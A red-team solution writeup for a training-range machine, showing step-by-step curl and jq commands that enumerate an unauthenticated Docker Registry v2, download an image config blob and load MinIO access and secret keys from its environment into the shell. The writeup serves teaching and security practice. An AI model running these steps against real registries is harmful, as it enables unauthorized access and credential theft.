# solve_red.md — M2 · dev-registry
## Red Team Solution Writeup
**Range:** RNG-DEV-01 · VIKAS TANTRA
**Machine:** M2 — PUL Container Registry
**Vulnerability:** Anonymous Docker Registry v2 reads and credentials embedded in an image config
**MITRE ATT&CK:** T1552.001 · T1613
**Severity:** Hard

---

## Objective

Enumerate the PUL Container Registry v2 API, retrieve the firmware-builder image config blob, and load the MinIO environment values. The registry's read endpoints are available without authentication; M1's credential candidate is not required for these requests.

## Environment

| Item | Value |
|---|---|
| Registry host | `203.0.3.36` |
| Registry port | `5000` |
| API | Docker Registry v2 |
| Authentication | Not required for the read endpoints used here |
| Next machine | M3 artifact store, port `9000` |

## Step-by-Step Exploitation

### Step 1 — Confirm the Registry API

```bash
curl --max-time 8 -fsS -i http://203.0.3.36:5000/v2/ | sed -n '1,8p'
```
<img width="937" height="284" alt="WindowsTerminal_4ocxETJPFa" src="https://github.com/user-attachments/assets/96ad1cfd-f0a9-49fe-84fc-5a805da3d16f" />

The response is HTTP 200 and includes the Docker Registry v2 header.

### Step 2 — Enumerate repositories

```bash
curl --max-time 8 -fsS http://203.0.3.36:5000/v2/_catalog | jq .
```
<img width="1152" height="227" alt="WindowsTerminal_AE3BY0Aaco" src="https://github.com/user-attachments/assets/7be30bb2-87c8-4382-bebe-5c5cb4341987" />


The catalog lists `pul/firmware-builder` and `pul/sonar-runner`.

### Step 3 — Get firmware-builder tags

```bash
curl --max-time 8 -fsS http://203.0.3.36:5000/v2/pul/firmware-builder/tags/list | jq .
```
<img width="1099" height="284" alt="WindowsTerminal_IgJ9ARxozK" src="https://github.com/user-attachments/assets/54bd87fd-223a-4cda-ab37-180903670650" />

The repository includes `latest`, `v3.2.1`, `v3.1.0`, and `v3.0.5`.

### Step 4 — Read the image manifest

```bash
curl --max-time 8 -fsS http://203.0.3.36:5000/v2/pul/firmware-builder/manifests/latest | jq .
```
<img width="1177" height="363" alt="WindowsTerminal_Oxfa6VtfLG" src="https://github.com/user-attachments/assets/af202a6e-baaf-4bdc-95fa-44f718486a6e" />

The config digest for `latest` is:

```text
sha256:a4f3c2b1e8d7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1
```

### Step 5 — Retrieve the config blob

```bash
DIGEST="sha256:a4f3c2b1e8d7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1"
curl --max-time 8 -fsS "http://203.0.3.36:5000/v2/pul/firmware-builder/blobs/${DIGEST}" -o "$RANGE3_DIR/registry-config.json"
printf 'ENV keys: %s\n' "$(jq -r '[.config.Env[] | split("=")[0]] | join(", ")' "$RANGE3_DIR/registry-config.json")"
export MINIO_ACCESS_KEY="$(jq -r '.config.Env[] | select(startswith("MINIO_ACCESS_KEY=")) | sub("^[^=]*=";"")' "$RANGE3_DIR/registry-config.json")"
export MINIO_SECRET_KEY="$(jq -r '.config.Env[] | select(startswith("MINIO_SECRET_KEY=")) | sub("^[^=]*=";"")' "$RANGE3_DIR/registry-config.json")"
printf 'MinIO values loaded into this shell; values not printed.\n'
```
<img width="1454" height="248" alt="WindowsTerminal_FddfNr6Rbc" src="https://github.com/user-attachments/assets/40336301-3bf5-48e4-9b37-67125e8647b9" />

The image environment includes MinIO access values. They are redacted in this public writeup. Its `ARTIFACT_STORE_HOST` is the scenario placeholder `11.x.x.x`; the artifact store in this deployment is reachable at `203.0.3.36:9000`.

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Discovery | Container and Resource Discovery | T1613 |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |

## Notes for Operator

Keep the same Kali terminal open so `RANGE3_DIR`, `MINIO_ACCESS_KEY`, and `MINIO_SECRET_KEY` remain available for the following steps. M3's bucket is public, so the MinIO values are not needed for its documented read requests.
